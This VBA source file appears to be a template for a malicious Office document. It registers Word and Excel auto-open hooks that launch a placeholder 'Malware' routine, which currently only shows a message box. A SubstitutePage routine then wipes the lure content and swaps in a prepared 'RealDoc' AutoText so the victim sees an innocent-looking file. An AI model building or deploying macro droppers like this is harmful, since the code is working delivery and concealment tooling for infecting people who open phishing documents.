Public alreadyLaunched As Integer


Private Sub Malware()
    '
    ' ============================================
    '
    ' Enter here your malware code here.
    ' It will be started on auto open surely.
    '
    ' ============================================

    MsgBox ("Here comes the malware!")

    ' ============================================

End Sub


Private Sub Launch()
    If alreadyLaunched = True Then
        Exit Sub
    End If
    Malware
    SubstitutePage
    alreadyLaunched = True
End Sub

Private Sub SubstitutePage()
    '
    ' This routine will take the entire Document's contents,
    ' delete them and insert in their place contents defined in
    ' INSERT -> Quick Parts -> AutoText -> named as in `autoTextTemplateName`
    '
    Dim doc As Word.Document
    Dim firstPageRange As Range
    Dim rng As Range
    Dim autoTextTemplateName As String

    ' This is the name of the defined AutoText prepared in the document,
    ' to be inserted in place of previous contents.
    autoTextTemplateName = "RealDoc"

    Set firstPageRange = Word.ActiveDocument.Range
    firstPageRange.Select
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1

    Set doc = ActiveDocument
    Set rng = doc.Sections(1).Range
    doc.AttachedTemplate.AutoTextEntries(autoTextTemplateName).Insert rng, True
    doc.Save

End Sub

Sub AutoOpen()
    ' Becomes launched as first on MS Word
    Launch
End Sub

Sub Document_Open()
    ' Becomes launched as second, another try, on MS Word
    Launch
End Sub

Sub Auto_Open()
    ' Becomes launched as first on MS Excel
    Launch
End Sub

Sub Workbook_Open()
    ' Becomes launched as second, another try, on MS Excel
    Launch
End Sub
